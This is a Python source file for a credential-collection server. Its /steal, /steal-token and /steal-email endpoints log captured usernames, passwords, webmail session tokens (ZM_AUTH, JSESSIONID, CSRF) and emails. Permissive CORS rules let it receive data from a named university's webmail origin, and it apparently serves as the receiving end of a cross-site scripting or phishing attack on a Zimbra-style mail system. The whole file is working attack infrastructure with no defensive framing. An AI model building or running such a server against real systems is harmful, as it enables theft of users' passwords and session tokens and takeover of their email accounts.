import http.server
import socketserver
import urllib.parse
import sys
import json
import logging
from datetime import datetime
import socket

# Configuration
PORT = 3001
ALLOWED_ORIGINS = [
    "https://mail1.cselab.nitrkl.in",
    "http://localhost:4000",
    "http://127.0.0.1:4000"
]

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'server_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def send_cors_headers(self):
        """Add CORS and security headers to the response."""
        origin = self.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            self.send_header("Access-Control-Allow-Origin", origin)
        else:
            self.send_header("Access-Control-Allow-Origin", "*")  # More permissive for testing
        
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
        self.send_header("Access-Control-Allow-Credentials", "true")
        
        # Less restrictive security headers for testing
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")

    def do_GET(self):
        """Handle GET requests with better error handling."""
        try:
            parsed_path = urllib.parse.urlparse(self.path)
            query_params = urllib.parse.parse_qs(parsed_path.query)
            
            logger.info(f"GET request to: {self.path}")
            logger.info(f"Query params: {query_params}")
            
            # Handle specific endpoints
            if parsed_path.path == '/steal':
                username = query_params.get('username', [''])[0]
                password = query_params.get('password', [''])[0]
                logger.info(f"CREDENTIALS CAPTURED - Username: {username}, Password: {password}")
                
            elif parsed_path.path == '/steal-token':
                zm_token = query_params.get('zm_auth_token', [''])[0]
                jsessionid = query_params.get('jsessionid', [''])[0]
                csrf_token = query_params.get('csrf_token', [''])[0]
                logger.info(f"TOKENS CAPTURED - ZM_AUTH: {zm_token}, JSESSIONID: {jsessionid}, CSRF: {csrf_token}")
                
            elif parsed_path.path == '/steal-email':
                # This should be handled by POST, but adding GET support
                logger.info("Email endpoint accessed via GET")
                
            elif parsed_path.path == '/test':
                logger.info("Test endpoint accessed - server is working")
            
            # Send immediate response
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.send_cors_headers()
            self.end_headers()
            
            response = {
                "status": "success",
                "message": "Data received successfully",
                "timestamp": datetime.now().isoformat(),
                "received_data": query_params
            }
            
            response_json = json.dumps(response)
            self.wfile.write(response_json.encode('utf-8'))
            self.wfile.flush()
            
        except Exception as e:
            logger.error(f"Error in GET request: {e}")
            self.send_error_response(500, str(e))

    def do_POST(self):
        """Handle POST requests for email data."""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length <= 0:
                self.send_error_response(400, "No data provided")
                return
                
            post_data = self.rfile.read(content_length).decode('utf-8')
            logger.info(f"POST data received: {post_data}")
            
            try:
                data = json.loads(post_data)
                email = data.get('email', 'No email provided')
                logger.info(f"EMAIL CAPTURED: {email}")
                
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                
                response = {
                    "status": "success",
                    "message": "Email received successfully",
                    "email": email,
                    "timestamp": datetime.now().isoformat()
                }
                
                self.wfile.write(json.dumps(response).encode('utf-8'))
                self.wfile.flush()
                
            except json.JSONDecodeError as e:
                logger.error(f"JSON decode error: {e}")
                self.send_error_response(400, "Invalid JSON data")
                
        except Exception as e:
            logger.error(f"Error in POST request: {e}")
            self.send_error_response(500, str(e))

    def do_OPTIONS(self):
        """Handle CORS preflight requests quickly."""
        self.send_response(200)
        self.send_cors_headers()
        self.send_header("Content-Length", "0")
        self.end_headers()
        logger.info("CORS preflight request handled")

    def send_error_response(self, status_code, message):
        """Send error response with CORS headers."""
        self.send_response(status_code)
        self.send_header("Content-type", "application/json")
        self.send_cors_headers()
        self.end_headers()
        
        response = {
            "status": "error",
            "message": message,
            "timestamp": datetime.now().isoformat()
        }
        
        self.wfile.write(json.dumps(response).encode('utf-8'))

    def log_message(self, format, *args):
        """Custom logging."""
        logger.info(f"HTTP Request: {format % args}")

def run_server():
    """Start the server with better error handling."""
    try:
        if not check_port(PORT):
            logger.error(f"Port {PORT} is already in use")
            sys.exit(1)
            
        # Use ThreadingTCPServer for better concurrency
        with socketserver.ThreadingTCPServer(("", PORT), CustomHandler) as httpd:
            httpd.allow_reuse_address = True
            logger.info(f"Server running on port {PORT}")
            logger.info(f"Access at: http://localhost:{PORT}")
            logger.info(f"Allowed origins: {ALLOWED_ORIGINS}")
            
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                logger.info("Server stopped by user")
                
    except Exception as e:
        logger.error(f"Server startup failed: {e}")
        sys.exit(1)

def check_port(port):
    """Check if port is available."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(("", port))
            return True
        except socket.error:
            return False

if __name__ == "__main__":
    run_server()